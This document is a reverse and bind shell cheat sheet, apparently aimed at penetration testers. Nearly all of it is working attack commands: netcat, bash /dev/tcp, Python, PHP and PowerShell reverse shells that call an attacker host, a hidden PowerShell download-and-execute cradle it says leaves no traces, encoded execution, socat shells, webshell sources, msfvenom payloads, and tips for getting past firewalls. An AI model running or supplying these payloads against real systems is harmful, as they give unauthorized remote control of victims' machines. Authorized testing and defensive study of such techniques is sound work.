# All about reverse shells

* Try always using ports: 80 or 443 if open

# Serving

To upload malicious reverse shell code it is necessary to host this code

Try using ports 80 and 443 for this reason.

```
python -m SimpleHTTPServer 443
python3 -m http.server 443

php -S 0.0.0.0:443

ruby -run -e httpd . -p 443

busybox httpd -f -p 443
```

Refer for more to: https://blog.certcube.com/file-transfer-cheatsheet-for-pentesters/

# Bind Shells

## Powershell bind

```
#Uncomment and change the hardcoded port number (443) in the below line. Remove this help comment as well.

#$listener = [System.Net.Sockets.TcpListener]443;$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()
```

# Reverse shells

All of those methods assume that necessary programs like nc, python, php and etc are installed on target hosts.

* Firewall allow mostly outbound connections, that's why rever shell is so popular.
* You always need a listener to connect a rev shell to
`nc -lvnp <PORT>`
* by <PORT> selection try using ports 80, 443 because they are mostly not blocked by firewalls

## Netcat

* Necat: 
```
# Linux
nc <IP> <PORT> -e /bin/bash

# Windows
nc.exe <IP> <PORT> -e cmd.exe

```

## Bash

`bash -i >& /dev/tcp/ATTACKER-IP/ATTACKER-PORT 0>&1`

## Powershell

This script is tested on most windows machines and should work fine.

```
#replace <IP_ATTACKER> with target ip, so it is going to look something like this: TCPClient('10.231.12.44',443)

$client = New-Object System.Net.Sockets.TCPClient('<IP_ATTACKER>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PSReverseShell# ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}$client.Close();

launch on target
```

Launch the above script directly or save on local attacking maching and call it from powershell like that to execute in memory and leave no traces

`powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass "IEX(New-Object Net.WebClient).downloadString('http://192.168.219.xxx/raw.ps1')"`

`powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy By-Commandpass -File shell.ps1`

### Encoded POwershell Execution

```
$expression     = Get-Content -Path .\test.ps1
$commandBytes   = [System.Text.Encoding]::Unicode.GetBytes($expression)
$encodedCommand = [Convert]::ToBase64String($commandBytes)

Invoke-Expression ([System.Text.Encoding]::Unicode.GetString([convert]::FromBase64String($encodedCommand)))
```

## Python

* Python3: 

`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER-IP",ATTACKER-PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

and without subprocess

`python -c 'import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacking-ip",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.system("/bin/sh -i")'`

## PHP

```
php -r '$sock=fsockopen("ATTACKER-IP",ATTACKER-PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
(Assumes TCP uses file descriptor 3. If it doesn't work, try 4,5, or 6)
```

### PHP webshells

Nice collection here: https://github.com/JohnTroony/php-webshells

I TAKE ABSOLUTELY NO RESPONSIBILITY FOR ANY OF THOSE SHELLS. CHECK their CODE BEFORE USING!
THE ONLY SAFE SHELL is within kali linux webshells.

```
$ webshells
> webshells ~ Collection of webshells
/usr/share/webshells
├── asp
├── aspx
├── cfm
├── jsp
├── laudanum -> /usr/share/laudanum
├── perl
└── php

```

## Socat

* Socat is not well know but is super useful if able to launch
* Once launche socat can provide a fully interactive shell just like SSH

Here is bind shell example:

```
#On Victim with IP address 10.99.66.88 initiate a listener:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP4-LISTEN:3333,reuseaddr,fork,ignoreeof

#from attacker
socat file:`tty`,raw,echo=0 tcp:10.99.66.88:3333
```

## Webshell

In Kali it is integrated:

`$ webshells`

After that you shall be placed into the directory with webshells

```
> webshells ~ Collection of webshells
/usr/share/webshells
├── asp
├── aspx
├── cfm
├── jsp
├── laudanum -> /usr/share/laudanum
├── perl
└── php

```

Here you have a rich selection of all possible shells.

## Reverse Shell bytecode generation with MSFVENOM

Use for any available payload.

`msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.xxx.xxx LPORT=443 -f python`

`msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888`

# Shell Upgrade

* The bind/reverse shell is not always fully interactive but can be made using like that using Python trick:

1. Insert one those lines into victim CLI

<code> python -c 'import pty; pty.spawn("/bin/bash")' </code><br>
<code> python3 -c 'import pty;pty.spawn("/bin/bash")' </code>

## Getting fully working PTY

```
python -c 'import pty; pty.spawn("/bin/bash")'
^Z bg
stty -a
echo $TERM
stty raw -echo
fg
export TERM=...
stty rows xx columns yy
```